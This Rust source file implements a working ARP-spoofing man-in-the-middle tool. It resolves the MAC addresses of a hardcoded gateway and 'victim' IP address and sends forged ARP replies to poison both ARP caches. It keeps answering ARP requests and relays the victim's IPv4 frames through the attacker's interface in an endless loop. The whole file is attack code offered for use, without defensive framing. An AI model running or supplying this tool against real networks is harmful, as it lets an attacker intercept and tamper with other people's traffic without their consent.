mod arp_packets;

extern crate core;

use std::net::{IpAddr, Ipv4Addr};
use pnet_datalink;
use pnet::packet::{self, Packet};
use pnet::packet::arp::{ArpOperations};
use pnet::packet::ethernet::{EtherTypes};
use pnet::util::MacAddr;
use pnet_datalink::{Channel, DataLinkReceiver, DataLinkSender, NetworkInterface};

fn create_interface(interface_name: &str) -> NetworkInterface {
    pnet_datalink::interfaces().iter().find(|interface| {
        interface.name.eq(interface_name)
    }).expect(&format!("Interface {} could not be found", interface_name)).clone()
}

fn create_channels(network_interface: &NetworkInterface) -> (Box<dyn DataLinkSender>, Box<dyn DataLinkReceiver>) {
    let (tx, rx) = match pnet_datalink::channel(&network_interface, Default::default()) {
        Ok(Channel::Ethernet(rx, tx)) => (rx, tx),
        Ok(_) => panic!("unhandled channel type"),
        Err(e) => panic!("unable to create channel: {}", e),
    };
    (tx, rx)
}

fn get_local_ipv4_addr(network_interface: &NetworkInterface) -> Ipv4Addr {
    network_interface.ips.iter().find(|ip | {
        ip.ip().is_ipv4()
    }).map(|ip| match ip.ip() {
        IpAddr::V4(ip) => ip,
        _ => unreachable!(),
    }).expect("Unable to retrieve interface ipv4 address")
}

fn retrieve_mac_address(network_interface: &NetworkInterface, target_ip_addr: Ipv4Addr, tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver) -> Result<MacAddr, std::io::Error> {
    let sender_ip_addr = get_local_ipv4_addr(&network_interface);

    let packet = arp_packets::arp_request(network_interface.mac.unwrap(), sender_ip_addr, target_ip_addr);

    let process_next_packet = |rx: &mut dyn DataLinkReceiver| -> Option<MacAddr> {
        rx.next().ok().and_then(|incoming_packet| {
            packet::ethernet::EthernetPacket::owned(incoming_packet.to_owned())
        }).and_then(|ethernet_packet| {
            if ethernet_packet.get_ethertype() != EtherTypes::Arp {
                return None;
            }
            packet::arp::ArpPacket::owned(ethernet_packet.payload().to_owned())
        }).and_then(|arp_packet| {
            if arp_packet.get_operation() == ArpOperations::Reply && arp_packet.get_sender_proto_addr() == target_ip_addr {
                return Some(arp_packet.get_sender_hw_addr());
            }
            None
        })
    };

    // send an arp request packet, wait 5 sec for the response, if its unanswered send another arp request. Repeat this for a total of 10 arp request.
    // If the mac address could not be found return a timeout error.
    for _ in 0..5 {
        tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");

        let start_time = std::time::Instant::now();
        loop {
            match process_next_packet(rx) {
                Some(addr) => return Ok(addr),
                None => {},
            }
            if start_time.elapsed().as_millis() > 3000 {
                break;
            }
        }
    }
    Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Arp response timed out"))
}

fn send_arp_spoof_packets(network_interface: &NetworkInterface, gateway_ip_addr: Ipv4Addr, victim_ip_addr: Ipv4Addr, tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver, answer_arp_requests_for: std::time::Duration) {
    let gateway_mac_addr = retrieve_mac_address(&network_interface, gateway_ip_addr, tx, rx).expect("Could not locate gateway mac address");
    let victim_mac_addr = retrieve_mac_address(&network_interface, victim_ip_addr, tx, rx).expect("Could not locate victim mac address");

    let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), victim_ip_addr, gateway_mac_addr, gateway_ip_addr);
    tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");

    let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), gateway_ip_addr, victim_mac_addr, victim_ip_addr);
    tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");

    let process_next_packet = |tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver| {
        let ethernet_packet = rx.next().ok().and_then(|incoming_packet| {
            packet::ethernet::EthernetPacket::owned(incoming_packet.to_owned())
        });

        if let Some(ethernet_packet) = ethernet_packet {
            match ethernet_packet {
                packet if packet.get_ethertype() == EtherTypes::Arp => {
                    packet::arp::ArpPacket::owned(packet.payload().to_owned()).and_then::<packet::arp::ArpPacket, _>(|arp_packet| {
                        if arp_packet.get_operation() == ArpOperations::Request {
                            // if the victim sends an arp request for the gateway we answer
                            if arp_packet.get_sender_proto_addr() == victim_ip_addr && arp_packet.get_target_proto_addr() == gateway_ip_addr {
                                let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), gateway_ip_addr, victim_mac_addr, victim_ip_addr);
                                tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
                            }
                            // if anyone sends an arp request for the victim we answer
                            else if arp_packet.get_target_proto_addr() == victim_ip_addr {
                                let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), victim_ip_addr, arp_packet.get_sender_hw_addr(), arp_packet.get_sender_proto_addr());
                                tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
                            };
                        };
                        None
                    });
                },
                packet if packet.get_ethertype() == EtherTypes::Ipv4 => {
                    packet::ipv4::Ipv4Packet::owned(packet.payload().to_owned()).and_then::<packet::ipv4::Ipv4Packet,_>(|ipv4_packet| {
                        if packet.get_source() == victim_mac_addr && packet.get_destination() == network_interface.mac.unwrap() {
                            if let Some(mut new_packet) = packet::ethernet::MutableEthernetPacket::owned(packet.packet().to_vec()) {
                                new_packet.set_source(network_interface.mac.unwrap());
                                new_packet.set_destination(gateway_mac_addr);
                                tx.send_to(new_packet.packet(), None);
                            }
                        }
                        else if packet.get_source() == gateway_mac_addr && packet.get_destination() == network_interface.mac.unwrap() {
                            if let Some(mut new_packet) = packet::ethernet::MutableEthernetPacket::owned(packet.packet().to_vec()) {
                                new_packet.set_source(network_interface.mac.unwrap());
                                new_packet.set_destination(victim_mac_addr);
                                tx.send_to(new_packet.packet(), None);
                            }
                        }
                        None
                    });
                }
                _ => {}
            }
        }

    };

    let now = std::time::Instant::now();
    loop {
        process_next_packet(tx, rx);
        if now.elapsed() > answer_arp_requests_for {
            break
        }
    }
}

fn main() {
    let interface = create_interface("wlp3s0");
    let (mut tx, mut rx) = create_channels(&interface);

    loop {
        send_arp_spoof_packets(&interface, Ipv4Addr::new(192,168,0,1), Ipv4Addr::new(192,168,0,76), tx.as_mut(), rx.as_mut(), std::time::Duration::from_secs(10));
    }
}
